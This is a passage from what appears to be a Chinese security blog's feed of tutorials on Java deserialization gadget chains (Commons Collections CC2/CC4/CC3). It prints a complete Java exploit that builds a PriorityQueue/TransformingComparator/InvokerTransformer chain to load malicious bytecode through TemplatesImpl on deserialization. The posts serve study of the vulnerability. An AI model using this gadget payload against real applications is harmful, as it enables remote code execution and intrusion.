+&lt;p&gt;入口类我们选择&lt;code&gt;PriorityQueue&lt;/code&gt;，因为这个类实现了&lt;code&gt;java.io.Serializable&lt;/code&gt;接口，也有重写的&lt;code&gt;readObject&lt;/code&gt;方法，在&lt;code&gt;readObject&lt;/code&gt;方法中调用了&lt;code&gt;PriorityQueue.heapify()&lt;/code&gt;，&lt;code&gt;heapify()&lt;/code&gt;方法中调用了&lt;code&gt;PriorityQueue.siftDown()&lt;/code&gt;方法，&lt;code&gt;siftDown()&lt;/code&gt;方法中调用了&lt;code&gt;PriorityQueue.siftDownUsingComparator()&lt;/code&gt;方法，&lt;code&gt;siftDownUsingComparator()&lt;/code&gt;方法中会调用&lt;code&gt;comparator&lt;/code&gt;属性的&lt;code&gt;compare()&lt;/code&gt;方法。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;此时我们把&lt;code&gt;comparator&lt;/code&gt;属性初始化为&lt;code&gt;TransformingComparator&lt;/code&gt;对象，就会调用&lt;code&gt;TransformingComparator&lt;/code&gt;对象的&lt;code&gt;compare()&lt;/code&gt;方法，&lt;code&gt;compare()&lt;/code&gt;方法中会调用&lt;code&gt;transformer&lt;/code&gt;属性的&lt;code&gt;transform()&lt;/code&gt;方法，&lt;code&gt;transformer&lt;/code&gt;属性是在我们实例化这个类的时候传的参数赋值的，所以我们传一个&lt;code&gt;InvokerTransformer&lt;/code&gt;对象，就会调用&lt;code&gt;transform&lt;/code&gt;方法实现反射调用任意类。&lt;/p&gt;
+&lt;p&gt;但目前有一个问题，调用&lt;code&gt;InvokerTransformer.transform()&lt;/code&gt;传的参数要是我们实例化的&lt;code&gt;TemplatesImpl&lt;/code&gt;，但是是怎么把这个参数传递进去的？在 CC4 中分析过，我们要对&lt;code&gt;priorityQueue&lt;/code&gt;这个对象&lt;code&gt;add&lt;/code&gt;两次才能运行，这里关键就在于这个&lt;code&gt;add&lt;/code&gt;。
+在 CC4 中也分析过，调用&lt;code&gt;add&lt;/code&gt;方法也会触发&lt;code&gt;compare()&lt;/code&gt;方法，这样就会导致没有进行序列化时就加载了字节码。所以我们会先把&lt;code&gt;TransformingComparator&lt;/code&gt;的&lt;code&gt;transformer&lt;/code&gt;属性设置为一个无关值，等&lt;code&gt;add&lt;/code&gt;完之后在反射改回来。同时，如果我们&lt;code&gt;add(templates)&lt;/code&gt;两次，这样不仅能够进入循环，还能把&lt;code&gt;templates&lt;/code&gt;传入&lt;code&gt;compare()&lt;/code&gt;方法，从而实现调用到&lt;code&gt;InvokerTransformer.transform(templates)&lt;/code&gt;。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;这样就进入&lt;code&gt;InvokerTransformer&lt;/code&gt;的反射调用环节，如果我们想要动态加载字节码，此时需要调用&lt;code&gt;templates&lt;/code&gt;的&lt;code&gt;newTransformer&lt;/code&gt;方法，我们把&lt;code&gt;newTransformer&lt;/code&gt;方法放到&lt;code&gt;InvokerTransformer.transform()&lt;/code&gt;方法中去就能实现。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id="完整exp"&gt;
+ 完整EXP
+ &lt;a class="anchor" href="#%e5%ae%8c%e6%95%b4exp"&gt;#&lt;/a&gt;
+&lt;/h3&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-java" data-lang="java"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;package&lt;/span&gt; org.example;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; org.apache.commons.collections4.comparators.TransformingComparator;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; org.apache.commons.collections4.functors.ConstantTransformer;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; org.apache.commons.collections4.functors.InvokerTransformer;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; java.io.*;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; java.lang.reflect.Field;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; java.nio.file.Files;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; java.nio.file.Paths;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; java.util.PriorityQueue;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;class&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;test&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;static&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;void&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;serialize&lt;/span&gt;(Object obj) &lt;span style="color:#66d9ef"&gt;throws&lt;/span&gt; Exception {
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; ObjectOutputStream oos &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;new&lt;/span&gt; ObjectOutputStream(&lt;span style="color:#66d9ef"&gt;new&lt;/span&gt; FileOutputStream(&lt;span style="color:#e6db74"&gt;&amp;#34;ser.bin&amp;#34;&lt;/span&gt;));
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; oos.&lt;span style="color:#a6e22e"&gt;writeObject&lt;/span&gt;(obj);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;static&lt;/span&gt; Object &lt;span style="color:#a6e22e"&gt;unserialize&lt;/span&gt;(String Filename) &lt;span style="color:#66d9ef"&gt;throws&lt;/span&gt; Exception {
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; ObjectInputStream ois &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;new&lt;/span&gt; ObjectInputStream(&lt;span style="color:#66d9ef"&gt;new&lt;/span&gt; FileInputStream(Filename));
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; Object obj &lt;span style="color:#f92672"&gt;=&lt;/span&gt; ois.&lt;span style="color:#a6e22e"&gt;readObject&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; obj;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;static&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;void&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;main&lt;/span&gt;(String&lt;span style="color:#f92672"&gt;[]&lt;/span&gt; args) &lt;span style="color:#66d9ef"&gt;throws&lt;/span&gt; Exception{
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; TemplatesImpl templates &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;new&lt;/span&gt; TemplatesImpl();
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; Class&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;extends&lt;/span&gt; TemplatesImpl&lt;span style="color:#f92672"&gt;&amp;gt;&lt;/span&gt; templatesClass &lt;span style="color:#f92672"&gt;=&lt;/span&gt; templates.&lt;span style="color:#a6e22e"&gt;getClass&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; Field name &lt;span style="color:#f92672"&gt;=&lt;/span&gt; templatesClass.&lt;span style="color:#a6e22e"&gt;getDeclaredField&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;_name&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; name.&lt;span style="color:#a6e22e"&gt;setAccessible&lt;/span&gt;(&lt;span style="color:#66d9ef"&gt;true&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; name.&lt;span style="color:#a6e22e"&gt;set&lt;/span&gt;(templates,&lt;span style="color:#e6db74"&gt;&amp;#34;abc&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; Field bytecodes &lt;span style="color:#f92672"&gt;=&lt;/span&gt; templatesClass.&lt;span style="color:#a6e22e"&gt;getDeclaredField&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;_bytecodes&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; bytecodes.&lt;span style="color:#a6e22e"&gt;setAccessible&lt;/span&gt;(&lt;span style="color:#66d9ef"&gt;true&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;byte&lt;/span&gt;&lt;span style="color:#f92672"&gt;[]&lt;/span&gt; evil &lt;span style="color:#f92672"&gt;=&lt;/span&gt; Files.&lt;span style="color:#a6e22e"&gt;readAllBytes&lt;/span&gt;(Paths.&lt;span style="color:#a6e22e"&gt;get&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;D:\\java安全学习过程中的测试代码\\Calc.class&amp;#34;&lt;/span&gt;));
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;byte&lt;/span&gt;&lt;span style="color:#f92672"&gt;[][]&lt;/span&gt; codes&lt;span style="color:#f92672"&gt;=&lt;/span&gt;{evil};
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; bytecodes.&lt;span style="color:#a6e22e"&gt;set&lt;/span&gt;(templates,codes);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; InvokerTransformer invokerTransformer &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;new&lt;/span&gt; InvokerTransformer&lt;span style="color:#f92672"&gt;&amp;lt;&amp;gt;&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;newTransformer&amp;#34;&lt;/span&gt;,&lt;span style="color:#66d9ef"&gt;new&lt;/span&gt; Class&lt;span style="color:#f92672"&gt;[]&lt;/span&gt;{},&lt;span style="color:#66d9ef"&gt;new&lt;/span&gt; Object&lt;span style="color:#f92672"&gt;[]&lt;/span&gt;{});
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; TransformingComparator transformingComparator &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;new&lt;/span&gt; TransformingComparator&lt;span style="color:#f92672"&gt;&amp;lt;&amp;gt;&lt;/span&gt;(&lt;span style="color:#66d9ef"&gt;new&lt;/span&gt; ConstantTransformer&lt;span style="color:#f92672"&gt;&amp;lt;&amp;gt;&lt;/span&gt;(1));
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; PriorityQueue priorityQueue &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;new&lt;/span&gt; PriorityQueue&lt;span style="color:#f92672"&gt;&amp;lt;&amp;gt;&lt;/span&gt;(transformingComparator);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; priorityQueue.&lt;span style="color:#a6e22e"&gt;add&lt;/span&gt;(templates);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; priorityQueue.&lt;span style="color:#a6e22e"&gt;add&lt;/span&gt;(templates);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; Class&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;extends&lt;/span&gt; TransformingComparator&lt;span style="color:#f92672"&gt;&amp;gt;&lt;/span&gt; c &lt;span style="color:#f92672"&gt;=&lt;/span&gt; transformingComparator.&lt;span style="color:#a6e22e"&gt;getClass&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; Field transformer &lt;span style="color:#f92672"&gt;=&lt;/span&gt; c.&lt;span style="color:#a6e22e"&gt;getDeclaredField&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;transformer&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; transformer.&lt;span style="color:#a6e22e"&gt;setAccessible&lt;/span&gt;(&lt;span style="color:#66d9ef"&gt;true&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; transformer.&lt;span style="color:#a6e22e"&gt;set&lt;/span&gt;(transformingComparator,invokerTransformer);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; serialize(priorityQueue);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; unserialize(&lt;span style="color:#e6db74"&gt;&amp;#34;ser.bin&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id="总结"&gt;
+ 总结
+ &lt;a class="anchor" href="#%e6%80%bb%e7%bb%93"&gt;#&lt;/a&gt;
+&lt;/h2&gt;
+&lt;p&gt;CC 链直接差别都不大，前面的学懂了后面的链子很容易上手。&lt;/p&gt;</description></item><item><title>java反序列化之CC4</title><link>https://s0lowalker.github.io/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc4/</link><pubDate>Sun, 17 May 2026 00:00:00 +0000</pubDate><guid>https://s0lowalker.github.io/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc4/</guid><description>&lt;h1 id="java反序列化之cc4"&gt;
+ java反序列化之CC4
+ &lt;a class="anchor" href="#java%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e4%b9%8bcc4"&gt;#&lt;/a&gt;
+&lt;/h1&gt;
+&lt;h2 id="cc4-链分析"&gt;
+ CC4 链分析
+ &lt;a class="anchor" href="#cc4-%e9%93%be%e5%88%86%e6%9e%90"&gt;#&lt;/a&gt;
+&lt;/h2&gt;
+&lt;p&gt;CC 链的漏洞一般都和&lt;code&gt;transform&lt;/code&gt;方法分不开。&lt;/p&gt;
+&lt;p&gt;我们前面学习的 CC1、CC6、CC3，命令执行的方法就两种，为反射或动态加载字节码。而 CC4 链中如果&lt;code&gt;Commons-Collections4&lt;/code&gt;的版本在 4.1， &lt;code&gt;InvokerTransformer&lt;/code&gt;类不再继承&lt;code&gt;Serializable&lt;/code&gt;接口了，无法序列化。&lt;/p&gt;
+&lt;p&gt;既然&lt;code&gt;InvokerTransformer&lt;/code&gt;用不了，我们就去看看谁能替代它。这里使用的是&lt;code&gt;InstantiateTransformer&lt;/code&gt;，它的&lt;code&gt;transform&lt;/code&gt;方法中反射调用了构造器，接下来看看谁调用了&lt;code&gt;transform()&lt;/code&gt;。&lt;/p&gt;
+&lt;p&gt;在&lt;code&gt;TransformingComparator&lt;/code&gt;类的&lt;code&gt;compare()&lt;/code&gt;方法中调用了&lt;code&gt;transform()&lt;/code&gt;方法，而这个方法也很常见。&lt;/p&gt;
+&lt;p&gt;TransformingComparator#compare()：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-java" data-lang="java"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;int&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;compare&lt;/span&gt;(&lt;span style="color:#66d9ef"&gt;final&lt;/span&gt; I obj1, &lt;span style="color:#66d9ef"&gt;final&lt;/span&gt; I obj2) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;final&lt;/span&gt; O value1 &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;this&lt;/span&gt;.&lt;span style="color:#a6e22e"&gt;transformer&lt;/span&gt;.&lt;span style="color:#a6e22e"&gt;transform&lt;/span&gt;(obj1);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;final&lt;/span&gt; O value2 &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;this&lt;/span&gt;.&lt;span style="color:#a6e22e"&gt;transformer&lt;/span&gt;.&lt;span style="color:#a6e22e"&gt;transform&lt;/span&gt;(obj2);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;this&lt;/span&gt;.&lt;span style="color:#a6e22e"&gt;decorated&lt;/span&gt;.&lt;span style="color:#a6e22e"&gt;compare&lt;/span&gt;(value1, value2);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这个链子就和之前的3条不同了。接着往前找，在&lt;code&gt;java.util.PriorityQueue&lt;/code&gt;这个类中的&lt;code&gt;siftDownUsingComparator&lt;/code&gt;方法中调用了&lt;code&gt;compare()&lt;/code&gt;方法：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-java" data-lang="java"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;private&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;void&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;siftDownUsingComparator&lt;/span&gt;(&lt;span style="color:#66d9ef"&gt;int&lt;/span&gt; k, E x) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;int&lt;/span&gt; half &lt;span style="color:#f92672"&gt;=&lt;/span&gt; size &lt;span style="color:#f92672"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; 1;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;while&lt;/span&gt; (k &lt;span style="color:#f92672"&gt;&amp;lt;&lt;/span&gt; half) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;int&lt;/span&gt; child &lt;span style="color:#f92672"&gt;=&lt;/span&gt; (k &lt;span style="color:#f92672"&gt;&amp;lt;&amp;lt;&lt;/span&gt; 1) &lt;span style="color:#f92672"&gt;+&lt;/span&gt; 1;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; Object c &lt;span style="color:#f92672"&gt;=&lt;/span&gt; queue&lt;span style="color:#f92672"&gt;[&lt;/span&gt;child&lt;span style="color:#f92672"&gt;]&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;int&lt;/span&gt; right &lt;span style="color:#f92672"&gt;=&lt;/span&gt; child &lt;span style="color:#f92672"&gt;+&lt;/span&gt; 1;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (right &lt;span style="color:#f92672"&gt;&amp;lt;&lt;/span&gt; size &lt;span style="color:#f92672"&gt;&amp;amp;&amp;amp;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; comparator.&lt;span style="color:#a6e22e"&gt;compare&lt;/span&gt;((E) c, (E) queue&lt;span style="color:#f92672"&gt;[&lt;/span&gt;right&lt;span style="color:#f92672"&gt;]&lt;/span&gt;) &lt;span style="color:#f92672"&gt;&amp;gt;&lt;/span&gt; 0)
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; c &lt;span style="color:#f92672"&gt;=&lt;/span&gt; queue&lt;span style="color:#f92672"&gt;[&lt;/span&gt;child &lt;span style="color:#f92672"&gt;=&lt;/span&gt; right&lt;span style="color:#f92672"&gt;]&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (comparator.&lt;span style="color:#a6e22e"&gt;compare&lt;/span&gt;(x, (E) c) &lt;span style="color:#f92672"&gt;&amp;lt;=&lt;/span&gt; 0)
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;break&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; queue&lt;span style="color:#f92672"&gt;[&lt;/span&gt;k&lt;span style="color:#f92672"&gt;]&lt;/span&gt; &lt;span style="color:#f92672"&gt;=&lt;/span&gt; c;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; k &lt;span style="color:#f92672"&gt;=&lt;/span&gt; child;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; queue&lt;span style="color:#f92672"&gt;[&lt;/span&gt;k&lt;span style="color:#f92672"&gt;]&lt;/span&gt; &lt;span style="color:#f92672"&gt;=&lt;/span&gt; x;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;接着往上找，在这个类的&lt;code&gt;siftDown&lt;/code&gt;中调用了&lt;code&gt;siftDownUsingComparator&lt;/code&gt;：&lt;/p&gt;</description></item><item><title>java反序列化之CC3</title><link>https://s0lowalker.github.io/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc3/</link><pubDate>Thu, 14 May 2026 00:00:00 +0000</pubDate><guid>https://s0lowalker.github.io/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc3/</guid><description>&lt;h1 id="java反序列化之cc3"&gt;
+ java反序列化之CC3
+ &lt;a class="anchor" href="#java%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e4%b9%8bcc3"&gt;#&lt;/a&gt;
+&lt;/h1&gt;
+&lt;h2 id="cc3-简介"&gt;
+ CC3 简介
+ &lt;a class="anchor" href="#cc3-%e7%ae%80%e4%bb%8b"&gt;#&lt;/a&gt;
+&lt;/h2&gt;
+&lt;p&gt;CC3 和之前的 CC1 和 CC6 有很大区别，CC1 和 CC6 是通过&lt;code&gt;Runtime.exec()&lt;/code&gt;进行命令执行的，很多时候代码中会 ban 了&lt;code&gt;Runtime&lt;/code&gt;。&lt;/p&gt;
+&lt;p&gt;而在 CC3 中，是通过动态类加载机制实现自动执行&lt;strong&gt;恶意类代码&lt;/strong&gt;的。&lt;/p&gt;
+&lt;p&gt;下面再回顾以下 java 动态类加载机制。&lt;/p&gt;
+&lt;h2 id="templatesimpl-解析"&gt;
+ TemplatesImpl 解析
+ &lt;a class="anchor" href="#templatesimpl-%e8%a7%a3%e6%9e%90"&gt;#&lt;/a&gt;
+&lt;/h2&gt;
+&lt;p&gt;在我之前动态类加载的博客中有讲过利用&lt;code&gt;ClassLoader#defineClass&lt;/code&gt;直接加载字节码的方法。在这一条链子中，简单说就是调用&lt;code&gt;ClassLoader.loadClass()&lt;/code&gt;，然后会调用&lt;code&gt;ClassLoader.findClass()&lt;/code&gt;，然后会调用&lt;code&gt;ClassLoader.defineClass()&lt;/code&gt;。&lt;/p&gt;
+&lt;p&gt;这里从正向看这个链子，首先&lt;code&gt;loadClass()&lt;/code&gt;，作用是从已加载的类缓存、父加载器等位置寻找类（即双亲委派机制），在前面没有找到的情况下执行&lt;code&gt;findClass()&lt;/code&gt;。&lt;code&gt;findClass()&lt;/code&gt;这个方法根据名称或位置加载 class 字节码，然后调用&lt;code&gt;defineClass()&lt;/code&gt;。&lt;code&gt;findClass()&lt;/code&gt;这个方法通常会由子类实现。&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;defineClass()&lt;/code&gt;的作用是处理前面传入的字节码，把字节码转化成真正的 java 类。而此时的&lt;code&gt;defineClass()&lt;/code&gt;是有局限性的，因为只加载类，并不执行类。若需要执行，则需要先进行&lt;code&gt;newInstance()&lt;/code&gt;实例化。&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;ClassLoader&lt;/code&gt;的&lt;code&gt;defineClass()&lt;/code&gt;方法的作用域为&lt;code&gt;protected&lt;/code&gt;，我们需要找到作用域为&lt;code&gt;public&lt;/code&gt;的类方便使用。&lt;/p&gt;
+&lt;p&gt;在&lt;code&gt;TemplatesImpl&lt;/code&gt;类的静态内部类&lt;code&gt;TransletClassLoader&lt;/code&gt;中找到了我们能够运用的&lt;code&gt;defineClass&lt;/code&gt;。&lt;/p&gt;
